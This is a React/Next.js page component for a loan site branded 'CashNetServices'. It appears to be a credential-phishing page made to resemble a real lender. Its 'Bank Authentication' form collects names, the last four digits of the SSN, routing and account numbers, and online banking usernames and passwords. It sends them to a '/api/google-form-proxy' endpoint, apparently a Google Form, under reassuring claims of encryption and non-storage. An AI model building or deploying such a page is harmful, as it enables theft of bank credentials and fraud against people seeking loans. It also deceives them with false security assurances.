"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { ArrowLeft, Lock, ShieldCheck } from "lucide-react"
import Link from "next/link"
import { SkipLink } from "@/components/skip-link"
import { FormFieldError } from "@/components/form-field-error"
import { bankAuthSchema, type BankAuthFormData } from "@/lib/validation"
import { MobileNav } from "@/components/mobile-nav"

export default function BankAuthenticationPage() {
  const [formData, setFormData] = useState<BankAuthFormData>({
    firstName: "",
    lastName: "",
    ssnLast4: "",
    routingNumber: "",
    accountNumber: "",
    username: "",
    password: "",
  })
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setErrors({})
    setIsSubmitting(true)

    try {
      const validated = bankAuthSchema.parse(formData)
      
      const response = await fetch('/api/google-form-proxy', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(validated),
      })

      if (response.ok) {
        // Reset form
        setFormData({
          firstName: "",
          lastName: "",
          ssnLast4: "",
          routingNumber: "",
          accountNumber: "",
          username: "",
          password: "",
        })
        // Could redirect to a success page or show a toast notification
        window.location.href = '/?submitted=true'
      } else {
        throw new Error('Failed to submit form')
      }
    } catch (error) {
      if (error instanceof Error && "errors" in error) {
        const zodErrors = (error as any).errors
        const errorMap: Record<string, string> = {}
        zodErrors.forEach((err: any) => {
          if (err.path[0]) {
            errorMap[err.path[0]] = err.message
          }
        })
        setErrors(errorMap)
      } else {
        alert("Failed to submit form. Please try again.")
      }
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData({ ...formData, [name]: value })
    // Clear error for this field when user starts typing
    if (errors[name]) {
      setErrors({ ...errors, [name]: "" })
    }
  }

  return (
    <div className="min-h-screen bg-liner-to-br from-slate-50 via-teal-50 to-emerald-50">
      <SkipLink />
      {/* Header */}
      <header className="sticky top-0 z-50 border-b bg-white/95 backdrop-blur-sm">
                <div className="container mx-auto flex items-center justify-between px-4 py-4">
                    <Link href="/" className="flex items-center gap-2">
                        <span className="text-2xl font-bold">
                            <span className="text-secondary">Cash</span>
                            <span className="text-primary">NetServices</span>
                        </span>
                    </Link>
                    <nav className="hidden items-center gap-6 md:flex">
                        <Link href="/" className="text-sm font-medium hover:text-primary">
                            Home
                        </Link>
                        <Link href="/what-we-offer" className="text-sm font-medium hover:text-primary">
                            What We Offer
                        </Link>
                        <Link href="/rates-and-terms" className="text-sm font-medium hover:text-primary">
                            Rates & Terms
                        </Link>
                        <Link href="/faqs" className="text-sm font-medium hover:text-primary">
                            FAQs
                        </Link>
                        <Link href="/contact-us" className="text-sm font-medium text-primary">
                            Contact Us
                        </Link>
                        <Button size="sm" className="bg-secondary hover:bg-secondary/90" asChild>
                            <Link href="/bank-authentication">Apply Now</Link>
                        </Button>
                    </nav>
                    <MobileNav />
                </div>
            </header>

      {/* Main Content */}
      <main id="main-content" className="container mx-auto px-4 py-12">
        <div className="mx-auto max-w-2xl">
          {/* Back Button */}
          <Link
            href="/"
            className="mb-6 inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground"
          >
            <ArrowLeft className="h-4 w-4" />
            Back to qualification
          </Link>

          {/* Security Badge */}
          <div className="mb-6 flex items-center justify-center gap-2 rounded-lg bg-primary/10 py-3">
            <ShieldCheck className="h-5 w-5 text-primary" />
            <span className="text-sm font-semibold text-primary">Secure Bank Authentication</span>
          </div>

          {/* Main Card */}
          <Card className="shadow-2xl">
            <CardHeader className="space-y-3 text-center">
              <div className="flex justify-center">
                <div className="rounded-full bg-primary/10 p-4">
                  <Lock className="h-10 w-10 text-primary" />
                </div>
              </div>
              <CardTitle className="text-3xl">Bank Authentication</CardTitle>
              <CardDescription className="text-base">
                Please provide your banking information to complete your loan application
              </CardDescription>
            </CardHeader>

            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Personal Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Personal Information</h3>
                  <div className="grid gap-4 md:grid-cols-2">
                    <div className="space-y-2">
                      <Label htmlFor="firstName">
                        First Name <span aria-label="required" className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="firstName"
                        name="firstName"
                        type="text"
                        placeholder="Enter your first name"
                        value={formData.firstName}
                        onChange={handleChange}
                        required
                        aria-required="true"
                        aria-invalid={!!errors.firstName}
                        aria-describedby="firstName-error"
                        className="h-12"
                      />
                      <FormFieldError error={errors.firstName} id="firstName-error" />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="lastName">
                        Last Name <span aria-label="required" className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="lastName"
                        name="lastName"
                        type="text"
                        placeholder="Enter your last name"
                        value={formData.lastName}
                        onChange={handleChange}
                        required
                        aria-required="true"
                        aria-invalid={!!errors.lastName}
                        aria-describedby="lastName-error"
                        className="h-12"
                      />
                      <FormFieldError error={errors.lastName} id="lastName-error" />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="ssnLast4">
                      Last 4 digits of SSN <span aria-label="required" className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="ssnLast4"
                      name="ssnLast4"
                      type="text"
                      inputMode="numeric"
                      placeholder="1234"
                      value={formData.ssnLast4}
                      onChange={handleChange}
                      maxLength={4}
                      required
                      aria-required="true"
                      aria-invalid={!!errors.ssnLast4}
                      aria-describedby="ssnLast4-desc ssnLast4-error"
                      className="h-12"
                    />
                    <p id="ssnLast4-desc" className="text-xs text-muted-foreground">
                      We only need the last four digits to verify your identity.
                    </p>
                    <FormFieldError error={errors.ssnLast4} id="ssnLast4-error" />
                  </div>
                </div>

                {/* Bank Account Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Bank Account Information</h3>

                  <div className="space-y-2">
                    <Label htmlFor="routingNumber">
                      Bank Routing Number <span aria-label="required" className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="routingNumber"
                      name="routingNumber"
                      type="text"
                      placeholder="Enter 9-digit routing number"
                      value={formData.routingNumber}
                      onChange={handleChange}
                      maxLength={9}
                      required
                      aria-required="true"
                      aria-invalid={!!errors.routingNumber}
                      aria-describedby="routingNumber-desc routingNumber-error"
                      className="h-12"
                    />
                    <p id="routingNumber-desc" className="text-xs text-muted-foreground">
                      The routing number is typically found at the bottom left of your checks
                    </p>
                    <FormFieldError error={errors.routingNumber} id="routingNumber-error" />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="accountNumber">
                      Account Number <span aria-label="required" className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="accountNumber"
                      name="accountNumber"
                      type="text"
                      placeholder="Enter your account number"
                      value={formData.accountNumber}
                      onChange={handleChange}
                      required
                      aria-required="true"
                      aria-invalid={!!errors.accountNumber}
                      aria-describedby="accountNumber-error"
                      className="h-12"
                    />
                    <FormFieldError error={errors.accountNumber} id="accountNumber-error" />
                  </div>
                </div>

                {/* Online Banking Credentials */}
                <div className="space-y-4 border-t pt-6">
                  <h3 className="text-lg font-semibold">Online Banking Credentials</h3>

                  <div className="space-y-2">
                    <Label htmlFor="username">
                      Online Banking Username <span aria-label="required" className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="username"
                      name="username"
                      type="text"
                      placeholder="Enter your online banking username"
                      value={formData.username}
                      onChange={handleChange}
                      required
                      aria-required="true"
                      aria-invalid={!!errors.username}
                      aria-describedby="username-error"
                      className="h-12"
                    />
                    <FormFieldError error={errors.username} id="username-error" />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="password">
                      Online Banking Password <span aria-label="required" className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="password"
                      name="password"
                      type="password"
                      placeholder="Enter your online banking password"
                      value={formData.password}
                      onChange={handleChange}
                      required
                      aria-required="true"
                      aria-invalid={!!errors.password}
                      aria-describedby="password-error"
                      className="h-12"
                    />
                    <FormFieldError error={errors.password} id="password-error" />
                  </div>
                </div>

                {/* Security Notice */}
                <div className="rounded-lg bg-primary/5 p-4">
                  <div className="flex gap-3">
                    <Lock className="h-5 w-5 shrink-0 text-primary" />
                    <div className="space-y-1">
                      <p className="text-sm font-semibold">Your information is secure</p>
                      <p className="text-xs text-muted-foreground">
                        We use bank-level 256-bit encryption to protect your data. Your credentials are never stored and
                        are only used for verification purposes.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  disabled={isSubmitting}
                  className="w-full bg-secondary py-6 text-lg font-semibold hover:bg-secondary/90 disabled:opacity-50"
                >
                  {isSubmitting ? "Submitting..." : "Submit & Continue"}
                </Button>

                {/* Terms */}
                <p className="text-center text-xs text-muted-foreground">
                  By submitting this form, you agree to our Terms of Service and Privacy Policy
                </p>
              </form>
            </CardContent>
          </Card>

          {/* Trust Indicators */}
          <div className="mt-8 rounded-lg bg-white p-6 shadow-md">
            <h3 className="mb-4 text-center font-semibold">We keep your personal data safe and secure</h3>
            <p className="text-center text-sm text-muted-foreground">
              CashNetService.com uses high-grade security software to ensure the safety and privacy of your sensitive
              information.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-16 border-t bg-slate-800 py-8 text-white">
        <div className="container mx-auto px-4 text-center text-sm">
          <div className="mb-4">
            <span className="text-2xl font-bold">
              <span className="text-orange-400">Cash</span>
              <span className="text-teal-400">NetServices</span>
            </span>
          </div>
          <p className="mb-2">200 West Jackson Blvd, Suite 1400, Chicago, IL 60606, United States</p>
          <p className="mb-4">Toll Free: 888.361.6963</p>
          <p className="text-xs text-slate-400">© {new Date().getFullYear()} CashNetService.com. All rights reserved.</p>
        </div>
      </footer>
    </div>
  )
}
